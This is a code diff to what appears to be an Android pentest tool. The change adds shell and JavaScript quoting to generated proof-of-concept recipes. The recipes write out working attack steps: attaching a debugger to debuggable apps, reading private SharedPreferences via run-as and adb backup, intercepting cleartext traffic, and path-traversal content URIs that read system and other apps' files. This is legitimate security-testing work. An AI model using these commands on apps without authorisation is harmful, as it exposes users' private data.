@@ -34,6 +34,8 @@ are intentionally skipped.
 
 from __future__ import annotations
 
+import json
+import shlex
 from typing import Callable
 
 from venomhook.models import (
@@ -75,6 +77,32 @@ def _launcher_activity(meta: AndroidAppMeta) -> AndroidComponent | None:
     return activities[0] if activities else None
 
 
+def _single_line(value: object) -> str:
+    """Keep generated script commands one physical line per recipe step."""
+    return str(value).replace("\r", "\\r").replace("\n", "\\n")
+
+
+def _shell_join(args: list[object]) -> str:
+    return shlex.join(_single_line(a) for a in args)
+
+
+def _shell_arg(value: object) -> str:
+    return shlex.quote(_single_line(value))
+
+
+def _adb_shell(remote_args: list[object]) -> str:
+    """Quote both host-shell and Android remote-shell parsing layers."""
+    return _shell_join(["adb", "shell", _shell_join(remote_args)])
+
+
+def _adb_shell_cmd(remote_cmd: str) -> str:
+    return _shell_join(["adb", "shell", remote_cmd])
+
+
+def _js_string(value: object) -> str:
+    return json.dumps(str(value))
+
+
 # ---------- per-rule builders ----------
 
 
@@ -85,7 +113,10 @@ def _build_debuggable(meta: AndroidAppMeta, finding: ManifestFinding) -> list[Po
     launcher_note = (
         ""
         if launcher and "android.intent.action.MAIN" in launcher.intent_actions
-        else "Launcher activity not detected from manifest; substitute the actual activity FQN."
+        else (
+            "Launcher activity not detected from manifest; substitute the "
+            "actual activity FQN."
+        )
     )
     return [
         PoCArtifact(
@@ -101,8 +132,8 @@ def _build_debuggable(meta: AndroidAppMeta, finding: ManifestFinding) -> list[Po
                 "method invocation — bypassing any in-app anti-debug logic."
             ),
             commands=[
-                f"adb shell am start -D -n {pkg}/{launcher_name}",
-                f"PID=$(adb shell pidof {pkg})",
+                _adb_shell(["am", "start", "-D", "-n", f"{pkg}/{launcher_name}"]),
+                f"PID=$({_adb_shell(['pidof', pkg])})",
                 "adb forward tcp:8700 jdwp:$PID",
                 "jdb -attach localhost:8700 -sourcepath .",
             ],
@@ -125,8 +156,11 @@ def _build_debuggable(meta: AndroidAppMeta, finding: ManifestFinding) -> list[Po
                 "(SharedPreferences, sqlite databases, encryption keys)."
             ),
             commands=[
-                f"adb shell run-as {pkg} ls -la databases/ shared_prefs/ files/",
-                f"adb shell run-as {pkg} cat shared_prefs/*.xml",
+                _adb_shell([
+                    "run-as", pkg, "ls", "-la",
+                    "databases/", "shared_prefs/", "files/",
+                ]),
+                _adb_shell_cmd(f"run-as {_shell_arg(pkg)} cat shared_prefs/*.xml"),
             ],
             expected_evidence=(
                 "Directory listing of the app's private storage and contents "
@@ -155,8 +189,9 @@ def _build_cleartext(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoC
             ),
             commands=[
                 "mitmproxy --listen-port 8080 --mode regular",
-                "# On device: Settings > Wi-Fi > <network> > Proxy: manual host=<PC IP> port=8080",
-                f"adb shell am start -n {pkg}/.MainActivity",
+                "# On device: Settings > Wi-Fi > <network> > "
+                "Proxy: manual host=<PC IP> port=8080",
+                _adb_shell(["am", "start", "-n", f"{pkg}/.MainActivity"]),
                 "# Watch mitmproxy console for plaintext request/response pairs",
             ],
             expected_evidence=(
@@ -189,10 +224,14 @@ def _build_allow_backup(meta: AndroidAppMeta, finding: ManifestFinding) -> list[
                 "with only USB debugging access. No root required."
             ),
             commands=[
-                f"adb backup -f {pkg}.ab -apk -shared -all -system {pkg}",
+                _shell_join([
+                    "adb", "backup", "-f", f"{pkg}.ab",
+                    "-apk", "-shared", "-all", "-system", pkg,
+                ]),
                 "# User must tap 'Back up my data' on the device prompt",
-                f"dd if={pkg}.ab bs=24 skip=1 | openssl zlib -d > {pkg}.tar",
-                f"tar -xvf {pkg}.tar",
+                f"dd if={_shell_arg(f'{pkg}.ab')} bs=24 skip=1 | "
+                f"openssl zlib -d > {_shell_arg(f'{pkg}.tar')}",
+                _shell_join(["tar", "-xvf", f"{pkg}.tar"]),
             ],
             expected_evidence=(
                 "Tar contains apps/<pkg>/{sp,db,f,r}/ trees with the app's "
@@ -210,16 +249,20 @@ def _build_allow_backup(meta: AndroidAppMeta, finding: ManifestFinding) -> list[
 
 def _am_command_for(component: AndroidComponent, pkg: str, action: str | None) -> str:
     """Compose an `adb shell am ...` line for a given component type."""
-    target = f"-n {pkg}/{component.name}"
-    action_part = f" -a {action}" if action else ""
+    args = ["am"]
     if component.type == "activity":
-        return f"adb shell am start{action_part} {target}"
-    if component.type == "service":
-        return f"adb shell am startservice{action_part} {target}"
-    if component.type == "receiver":
-        return f"adb shell am broadcast{action_part} {target}"
-    # Fallback (provider falls under MANIFEST-005, not this builder).
-    return f"adb shell am start{action_part} {target}"
+        args.append("start")
+    elif component.type == "service":
+        args.append("startservice")
+    elif component.type == "receiver":
+        args.append("broadcast")
+    else:
+        # Fallback (provider falls under MANIFEST-005, not this builder).
+        args.append("start")
+    if action:
+        args.extend(["-a", action])
+    args.extend(["-n", f"{pkg}/{component.name}"])
+    return _adb_shell(args)
 
 
 def _build_exported_no_permission(
@@ -240,7 +283,12 @@ def _build_exported_no_permission(
                 "Component is exported with no permission. Substitute the "
                 "appropriate `am` subcommand based on its type."
             ),
-            commands=[f"adb shell am start -n {pkg}/{finding.component or '<class>'}"],
+            commands=[
+                _adb_shell([
+                    "am", "start", "-n",
+                    f"{pkg}/{finding.component or '<class>'}",
+                ])
+            ],
             references=list(finding.references),
         )]
 
@@ -286,13 +334,13 @@ def _frida_intent_observer(
     actually reached the component and observe what payload arrived.
     """
     if component.type == "activity":
-        body = _FRIDA_ACTIVITY_TEMPLATE.format(klass=component.name)
+        body = _FRIDA_ACTIVITY_TEMPLATE.format(klass=_js_string(component.name))
         entry = "onCreate"
     elif component.type == "service":
-        body = _FRIDA_SERVICE_TEMPLATE.format(klass=component.name)
+        body = _FRIDA_SERVICE_TEMPLATE.format(klass=_js_string(component.name))
         entry = "onStartCommand"
     elif component.type == "receiver":
-        body = _FRIDA_RECEIVER_TEMPLATE.format(klass=component.name)
+        body = _FRIDA_RECEIVER_TEMPLATE.format(klass=_js_string(component.name))
         entry = "onReceive"
     else:  # pragma: no cover — providers go through MANIFEST-005
         body = f"// unsupported component type: {component.type}"
@@ -317,7 +365,11 @@ def _frida_intent_observer(
             "the calling shell supplied."
         ),
         notes=(
-            f"Run with: frida -U -f {pkg} -l <this-file>.frida.js --no-pause"
+            "Run with: "
+            + _shell_join([
+                "frida", "-U", "-f", pkg,
+                "-l", "<this-file>.frida.js", "--no-pause",
+            ])
         ),
         references=list(finding.references),
     )
@@ -325,9 +377,10 @@ def _frida_intent_observer(
 
 _FRIDA_ACTIVITY_TEMPLATE = """\
 Java.perform(() => {{
-  const Klass = Java.use("{klass}");
+  const Klass = Java.use({klass});
+  const KlassName = {klass};
   Klass.onCreate.overload('android.os.Bundle').implementation = function (b) {{
-    console.log("[+] {klass}.onCreate called");
+    console.log("[+] " + KlassName + ".onCreate called");
     const intent = this.getIntent();
     if (intent) {{
       console.log("[+]   action:", intent.getAction());
@@ -346,10 +399,11 @@ Java.perform(() => {{
 
 _FRIDA_SERVICE_TEMPLATE = """\
 Java.perform(() => {{
-  const Klass = Java.use("{klass}");
+  const Klass = Java.use({klass});
+  const KlassName = {klass};
   Klass.onStartCommand.implementation = function (intent, flags, startId) {{
     const action = intent ? intent.getAction() : null;
-    console.log("[+] {klass}.onStartCommand action =", action);
+    console.log("[+] " + KlassName + ".onStartCommand action =", action);
     if (intent) {{
       const extras = intent.getExtras();
       if (extras) {{
@@ -366,10 +420,11 @@ Java.perform(() => {{
 
 _FRIDA_RECEIVER_TEMPLATE = """\
 Java.perform(() => {{
-  const Klass = Java.use("{klass}");
+  const Klass = Java.use({klass});
+  const KlassName = {klass};
   Klass.onReceive.implementation = function (ctx, intent) {{
     const action = intent ? intent.getAction() : null;
-    console.log("[+] {klass}.onReceive action =", action);
+    console.log("[+] " + KlassName + ".onReceive action =", action);
     if (intent) {{
       const extras = intent.getExtras();
       if (extras) {{
@@ -427,8 +482,11 @@ def _build_exported_provider(
                 "query/insert/update/delete via `adb shell content`."
             ),
             commands=[
-                f"adb shell content query --uri content://{authority}/",
-                f"adb shell content query --uri content://{authority}/<path>",
+                _adb_shell(["content", "query", "--uri", f"content://{authority}/"]),
+                _adb_shell([
+                    "content", "query", "--uri",
+                    f"content://{authority}/<path>",
+                ]),
             ],
             expected_evidence=(
                 "Returned rows from the provider, or 'No result found.' "
@@ -461,11 +519,20 @@ def _build_grant_uri(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoC
             ),
             commands=[
                 "# Probe with a normal path first to confirm reachability:",
-                f"adb shell content query --uri content://{authority}/files/test",
+                _adb_shell([
+                    "content", "query", "--uri",
+                    f"content://{authority}/files/test",
+                ]),
                 "# Then probe traversal payloads:",
-                f"adb shell content read --uri content://{authority}/files/../../../etc/hosts",
-                f"adb shell content read --uri content://{authority}/files/..%2F..%2F..%2Fdata%2Fdata%2F"
-                + pkg + "%2Fshared_prefs%2F",
+                _adb_shell([
+                    "content", "read", "--uri",
+                    f"content://{authority}/files/../../../etc/hosts",
+                ]),
+                _adb_shell([
+                    "content", "read", "--uri",
+                    f"content://{authority}/files/..%2F..%2F..%2Fdata%2Fdata%2F"
+                    + pkg + "%2Fshared_prefs%2F",
+                ]),
             ],
             expected_evidence=(
                 "File contents from outside the provider's intended root "
